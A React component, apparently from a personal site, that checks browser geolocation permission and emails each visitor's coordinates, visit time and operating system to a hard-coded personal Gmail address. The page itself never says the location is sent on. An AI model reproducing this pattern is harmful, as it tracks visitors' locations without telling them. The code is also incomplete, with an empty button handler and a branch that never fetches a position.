import React, { useState, useEffect } from 'react';
import { api } from '../../services/api';
import { LocationStyle } from './style';

const LocationPermissionComponent: React.FC = () => {
    const [permissionGranted, setPermissionGranted] = useState<boolean | null>(null);

    const getOperatingSystem = (): string => {
        const platform = navigator.platform.toLowerCase();

        if (platform.includes('win')) {
            return 'Windows';
        } else if (platform.includes('mac')) {
            return 'MacOS';
        } else if (platform.includes('linux')) {
            return 'Linux';
        } else if (platform.includes('android')) {
            return 'Android';
        } else if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) {
            return 'iOS';
        } else {
            return 'Unknown';
        }
    };
    useEffect(() => {
        const askForLocationPermission = async () => {
            try {
                if (navigator.permissions) {
                    const result = await navigator.permissions.query({ name: 'geolocation' });

                    if (result.state === 'granted') {
                        setPermissionGranted(true);
                    } else if (result.state === 'prompt') {
                        setPermissionGranted(null);
                    } else {
                        setPermissionGranted(false);
                    }
                } else if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            setPermissionGranted(true);
                            sendEmailWithLocation(position);
                        },
                        (error) => {
                            console.error('Erro ao obter a localização:', error);
                            setPermissionGranted(false);
                            sendEmailWithoutLocation();
                        }
                    );
                } else {
                    setPermissionGranted(false);
                    sendEmailWithoutLocation();
                }
            } catch (error) {
                console.error('Erro ao verificar permissão de geolocalização:', error);
                setPermissionGranted(false);
                sendEmailWithoutLocation();
            }
        };

        askForLocationPermission();
    }, []);

    const sendEmailWithLocation = (position: GeolocationPosition) => {
        const hours = new Date().getHours();
        const minutes = new Date().getMinutes();

        // Adicione aqui a lógica para enviar o e-mail com a localização
        api.post("/send-email", {
            email: "eldson.caldasw@gmail.com",
            message: `Uma nova visita às ${hours}:${minutes} do dispositivo ${getOperatingSystem()}.`,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        }).then(() => {
            console.log("Email enviado com sucesso!");
        }).catch((err: any) => {
            console.log(err);
        });
    };

    const sendEmailWithoutLocation = () => {
        const hours = new Date().getHours();
        const minutes = new Date().getMinutes();

        // Adicione aqui a lógica para enviar o e-mail sem a localização
        api.post("/send-email", {
            email: "eldson.caldasw@gmail.com",
            message: `Uma nova visita às ${hours}:${minutes} do dispositivo ${getOperatingSystem()}.`,
            latitude: "0",
            longitude: "0"
        }).then(() => {
            console.log("Email enviado com sucesso!");
        }).catch((err: any) => {
            console.log(err);
        });
    };

    const handlePermissionButtonClick = async () => {
        // Adicione aqui a lógica para lidar com a solicitação de permissão
    };

    return (
        <LocationStyle>
            {permissionGranted === null && (
                <div>
                    <p>Solicitando permissão para acessar a localização...</p>
                </div>
            )}
            {permissionGranted === true && (
                <div>
                    <p>Permissão concedida para acessar a localização.</p>
                    {/* Adicione aqui o código para exibir informações de localização ou fazer outras operações */}
                </div>
            )}
            {permissionGranted === false && (
                <div>
                    <p>Permissão negada para acessar a localização.</p>
                </div>
            )}
            {permissionGranted === null && (
                <button onClick={handlePermissionButtonClick}>Solicitar Permissão</button>
            )}
        </LocationStyle>
    );
};

export default LocationPermissionComponent;
